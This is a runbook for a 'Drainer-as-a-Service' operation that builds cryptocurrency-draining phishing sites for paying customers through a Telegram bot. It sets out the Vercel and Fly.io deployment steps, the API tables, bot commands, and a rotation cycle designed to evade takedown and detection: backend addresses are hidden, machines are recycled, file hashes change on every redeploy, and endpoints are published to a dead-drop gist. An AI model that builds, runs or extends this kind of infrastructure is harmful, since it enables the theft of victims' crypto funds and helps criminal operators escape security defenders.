# Drainer-as-a-Service — Runbook (legacy)

Superseded by [SETUP.md](SETUP.md) + [yale.md](yale.md) — kept for the API/cycle reference tables.

Chimera hosts customer drainer sites: the Telegram bot takes a customer's
wallet, chimera deploys their page to a stable Vercel project, and a stable
Fly app (rotating machine) runs the Yale backend.

```
Customer ─Telegram─► bot ─HTTP─► core/service_api.py
                                 │
                    ┌────────────┴────────────┐
                    ▼                         ▼
          Vercel (per customer)      Fly app: chimera-drainer
          claim-xxxx.vercel.app      chimera-drainer.fly.dev
          stable URL, content        stable hostname, machine
          re-rendered every cycle    recycled every cycle
```

Payload pages call same-origin API paths; each project's `vercel.json`
rewrites them to the backend. The backend address never appears in client
code, and rotating the backend never breaks a deployed page.

## One-time setup

1. **config.yaml** — fill the `TODO_FILL` values (Fly token/org, Vercel
   token/team, GitHub token/gist, SnowProxies). The `drainer:` section is
   already generated; fill `env.TELEGRAM_BOT_TOKEN` + `env.TELEGRAM_CHAT_ID`
   (customer fallback) + `env.OPERATOR_CHAT_ID` (operator group for hits).
   `drainer.aes_secret` must match the bot's `AES_SECRET` env.

2. **Build + push the backend image** (Docker Desktop must be running):

   ```bash
   cd yale/server
   fly auth docker
   docker build -t registry.fly.io/chimera-drainer:latest .
   docker push registry.fly.io/chimera-drainer:latest
   ```

3. **Bot .env** (sol+spl repo, `bot/`):

   ```
   BOT_TOKEN=<botfather token>
   CHIMERA_API_URL=http://127.0.0.1:8444
   CHIMERA_SERVICE_KEY=<same as config.yaml drainer.service_key>
   AES_SECRET=<same as config.yaml drainer.aes_secret>
   ```

## Run

```bash
# terminal 1 — chimera (rotation loop + API)
cd chimera && python -m core.service_api

# terminal 2 — the bot
cd yale/bot && npm start
```

## API (auth: X-Service-Key header)

| Method | Path | Purpose |
|---|---|---|
| GET | /health | service status (no auth) |
| GET | /customers | list customers + URLs |
| POST | /customers | `{wallet, chat_id}` → `{wallet, url, project_name}` |
| POST | /customers/redeploy | `{wallet}` → fresh deploy, same URL |
| GET | /backend/health | probe backend /health |
| POST | /cycle | run a rotation cycle now |

## Rotation cycle (every `cycle_minutes`)

1. Recycle the backend machine (fresh ID, private IP, session key —
   same `chimera-drainer.fly.dev` hostname)
2. Probe `/health` (may still be booting — logged, not fatal)
3. Redeploy every customer site with a fresh nonce (new file hash,
   same URL)
4. Publish endpoints to the dead drop gist

## Bot commands

| Command | Behavior |
|---|---|
| /start, wallet paste | hosted deploy → live URL (or zip fallback on error) |
| /build <wallet> | same, direct |
| /zip <wallet> | raw payload zip (self-hosting mode) |
| /stats | build counts (admin) |

## Testing

```bash
python -m pytest tests/ -q        # 29 tests, no cloud needed
python local_test.py              # dashboard + payload server mock
```
